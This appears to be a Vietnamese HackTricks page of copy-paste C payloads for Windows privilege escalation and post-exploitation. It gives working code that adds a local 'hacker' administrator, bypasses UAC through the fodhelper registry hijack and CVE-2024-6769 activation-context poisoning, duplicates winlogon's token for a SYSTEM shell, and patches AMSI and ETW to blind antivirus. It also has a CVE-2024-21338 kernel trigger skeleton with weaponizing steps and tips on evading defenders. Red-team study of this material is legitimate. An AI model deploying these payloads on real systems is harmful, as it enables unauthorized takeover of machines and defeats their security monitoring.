# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Trang này tổng hợp các **đoạn mã C nhỏ, độc lập** hữu ích trong quá trình Windows Local Privilege Escalation hoặc post-exploitation. Mỗi payload được thiết kế để **dễ sao chép và dán**, chỉ cần Windows API / C runtime và có thể biên dịch bằng `i686-w64-mingw32-gcc` (x86) hoặc `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Các payload này giả định tiến trình đã có đủ quyền tối thiểu cần thiết để thực hiện hành động (ví dụ: `SeDebugPrivilege`, `SeImpersonatePrivilege` hoặc ngữ cảnh medium-integrity để vượt qua UAC). Chúng dành cho các tình huống **red-team hoặc CTF**, trong đó việc khai thác lỗ hổng đã cho phép thực thi mã native tùy ý.

---

## Thêm người dùng quản trị cục bộ

```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
    system("net user hacker Hacker123! /add");
    system("net localgroup administrators hacker /add");
    return 0;
}
```

---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Toàn vẹn trung bình → cao)
Khi binary đáng tin cậy **`fodhelper.exe`** được thực thi, nó truy vấn đường dẫn registry bên dưới **mà không lọc verb `DelegateExecute`**. Bằng cách đặt lệnh của chúng ta dưới khóa đó, kẻ tấn công có thể bypass UAC *mà không cần ghi file xuống đĩa*.<sup>[[1]](#references)</sup>

*Đường dẫn registry được `fodhelper.exe` truy vấn*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PoC tối giản mở một `cmd.exe` với quyền nâng cao:

```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    HKEY hKey;
    const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

    // 1. Create the vulnerable registry key
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        // 2. Set default value => our payload
        RegSetValueExA(hKey, NULL, 0, REG_SZ,
            (const BYTE*)payload, (DWORD)strlen(payload) + 1);

        // 3. Empty "DelegateExecute" value = trigger (")
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
            (const BYTE*)"", 1);

        RegCloseKey(hKey);

        // 4. Launch auto-elevated binary
        system("fodhelper.exe");
    }
    return 0;
}
```
*Đã thử nghiệm trên Windows 10 22H2 và Windows 11 23H2 (bản vá tháng 7 năm 2025). Cách bypass vẫn hoạt động vì Microsoft chưa sửa lỗi thiếu kiểm tra tính toàn vẹn trong đường dẫn `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Việc ánh xạ lại ổ đĩa kết hợp với đầu độc cache activation context vẫn hoạt động trên các bản dựng Windows 10/11 đã được vá, vì `ctfmon.exe` chạy dưới dạng tiến trình giao diện người dùng đáng tin cậy với mức toàn vẹn cao, sẵn sàng tải từ ổ `C:` đã bị giả mạo của caller và tái sử dụng mọi chuyển hướng DLL mà `CSRSS` đã lưu cache. Cách khai thác như sau: trỏ lại `C:` đến nơi lưu trữ do attacker kiểm soát, thả một `msctf.dll` đã bị trojan hóa, khởi chạy `ctfmon.exe` để đạt mức toàn vẹn cao, sau đó yêu cầu `CSRSS` lưu cache một manifest chuyển hướng DLL được một binary tự động nâng quyền sử dụng (ví dụ: `fodhelper.exe`), để lần khởi chạy tiếp theo kế thừa payload của bạn mà không hiện lời nhắc UAC.<sup>[[5]](#references)</sup>

Quy trình thực tế:
1. Chuẩn bị một cây thư mục `%SystemRoot%\System32` giả và sao chép vào đó binary hợp lệ mà bạn định chiếm quyền (thường là `ctfmon.exe`).
2. Dùng `DefineDosDevice(DDD_RAW_TARGET_PATH)` để ánh xạ lại `C:` trong tiến trình của bạn, đồng thời giữ `DDD_NO_BROADCAST_SYSTEM` để thay đổi chỉ có hiệu lực cục bộ.
3. Thả DLL và manifest vào cây thư mục giả, gọi `CreateActCtx/ActivateActCtx` để đưa manifest vào cache activation context, rồi khởi chạy binary tự động nâng quyền để nó phân giải DLL được chuyển hướng và chạy thẳng vào shellcode của bạn.
4. Xóa mục cache (`sxstrace ClearCache`) hoặc khởi động lại khi hoàn tất để xóa dấu vết của attacker.

<details>
<summary>C - Trợ giúp đầu độc ổ đĩa giả + manifest (CVE-2024-6769)</summary>

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
    BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
    CloseHandle(h);
    return ok;
}

int wmain(void) {
    const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
    SHCreateDirectoryExW(NULL, stage, NULL);
    CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
    CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

    DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
                     L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

    const wchar_t manifest[] =
        L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
        L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
        L" <dependency><dependentAssembly>"
        L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
        L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
        L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
        L" </dependentAssembly></dependency></assembly>";
    WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

    ACTCTXW act = { sizeof(act) };
    act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
    ULONG_PTR cookie = 0;
    HANDLE ctx = CreateActCtxW(&act);
    ActivateActCtx(ctx, &cookie);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, 2000);
    DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
    return 0;
}
```

</details>

Mẹo dọn dẹp: sau khi lấy được SYSTEM, hãy chạy `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, sau đó chạy `sxstrace Parse` khi kiểm thử—nếu thấy tên manifest của bạn trong log, thì bên phòng thủ cũng có thể thấy, vì vậy hãy đổi đường dẫn mỗi lần chạy.

---

## Tạo shell SYSTEM qua token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Nếu tiến trình hiện tại có **cả hai** quyền `SeDebug` và `SeImpersonate` (điển hình với nhiều tài khoản dịch vụ), bạn có thể lấy token từ `winlogon.exe`, nhân bản token đó và khởi chạy một tiến trình có quyền nâng cao:

```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    if (!Process32FirstW(snap, &pe)) return 0;
    do {
        if (!_wcsicmp(pe.szExeFile, name)) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snap);
            return pid;
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}

int wmain(void) {
    DWORD pid = FindPid(L"winlogon.exe");
    if (!pid) return 1;

    HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE hToken  = NULL, dupToken = NULL;

    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

        STARTUPINFOW si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
                L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
                NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    if (hProc) CloseHandle(hProc);
    if (hToken) CloseHandle(hToken);
    if (dupToken) CloseHandle(dupToken);
    return 0;
}
```
Để biết giải thích chi tiết hơn về cách hoạt động, xem:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch AMSI & ETW trong bộ nhớ (né tránh phòng thủ)
Hầu hết các engine AV/EDR hiện đại đều dựa vào **AMSI** và **ETW** để kiểm tra các hành vi độc hại. Patch cả hai giao diện ngay từ đầu trong tiến trình hiện tại sẽ ngăn các payload dựa trên script (ví dụ: PowerShell, JScript) bị quét.<sup>[[2]](#references)</sup>

```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
    DWORD oldProt;
    // mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy(address, patch, sizeof(patch));
    VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
    HMODULE amsi  = LoadLibraryA("amsi.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
    if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

    MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
    return 0;
}
```
*Bản vá ở trên chỉ áp dụng cho tiến trình hiện tại; khởi chạy PowerShell mới sau khi chạy bản vá sẽ không bị AMSI/ETW kiểm tra.*

---

## Tạo tiến trình con dưới dạng Protected Process Light (PPL)
Yêu cầu mức bảo vệ PPL cho tiến trình con ngay khi tạo bằng `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Đây là API được tài liệu hóa và chỉ thành công nếu image đích được ký cho lớp signer được yêu cầu (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>

```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.StartupInfo.cb = sizeof(si);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
        &lvl, sizeof(lvl), NULL, NULL);

    if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
        // likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
        return 1;
    }
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

Các level được sử dụng phổ biến nhất:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Xác thực kết quả bằng Process Explorer/Process Hacker qua cột Protection.

---

## Local Service -> Kernel qua `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` cung cấp một device object (`\\.\\AppID`), trong đó IOCTL bảo trì smart-hash chấp nhận các function pointer do người dùng cung cấp khi caller chạy dưới quyền `LOCAL SERVICE`; Lazarus đang lạm dụng cơ chế này để vô hiệu hóa PPL và nạp driver tùy ý, vì vậy red team nên chuẩn bị sẵn trigger để dùng trong lab.<sup>[[6]](#references)</sup>

Lưu ý vận hành:
- Bạn vẫn cần token `LOCAL SERVICE`. Đánh cắp token này từ `Schedule` hoặc `WdiServiceHost` bằng `SeImpersonatePrivilege`, sau đó impersonate trước khi truy cập device để vượt qua các bước kiểm tra ACL.
- IOCTL `0x22A018` yêu cầu một struct chứa hai callback pointer (query length + read function). Trỏ cả hai đến các stub ở user mode để tạo token overwrite hoặc ánh xạ các ring-0 primitive, nhưng giữ các buffer ở chế độ RWX để KernelPatchGuard không gây crash giữa chừng.
- Sau khi thành công, thoát impersonation và thu hồi device handle; hiện các nhóm phòng thủ đang tìm kiếm handle `Device\\AppID` bất thường, vì vậy hãy đóng handle ngay khi có được quyền cao hơn.

<details>
<summary>C - Bộ khung trigger để lạm dụng smart-hash của `appid.sys`</summary>

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
    ULONGLONG UnknownCtx[4];
    PVOID QuerySize;   // called first
    PVOID ReadBuffer;  // called with size returned above
    BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
    // map SYSTEM shellcode, steal token, etc.
    return 0;
}

int wmain(void) {
    HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW failed: %lu\n", GetLastError());
        return 1;
    }

    APPID_SMART_HASH in = {0};
    in.QuerySize = KernelThunk;
    in.ReadBuffer = KernelThunk;

    DWORD bytes = 0;
    if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
        printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
    }
    CloseHandle(hDev);
    return 0;
}
```

</details>

Bản sửa tối thiểu cho một weaponized build: dùng `VirtualAlloc` để ánh xạ một section RWX, sao chép token duplication stub vào đó, đặt `KernelThunk = section`, và sau khi `DeviceIoControl` trả về, bạn sẽ có quyền SYSTEM, kể cả khi chạy dưới PPL.

---

## References

- [1] [Mục đầu tiên: Chào mừng và fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – trình khởi chạy tiến trình PPL tối giản](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [Hàm UpdateProcThreadAttribute (ứng dụng Win32) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Chuỗi khai thác mới cho phép bypass UAC trên Windows](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus và FudModule Rootkit: Vượt ra ngoài BYOVD với Zero-Day từ Admin lên Kernel](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)
{{#include ../../banners/hacktricks-training.md}}
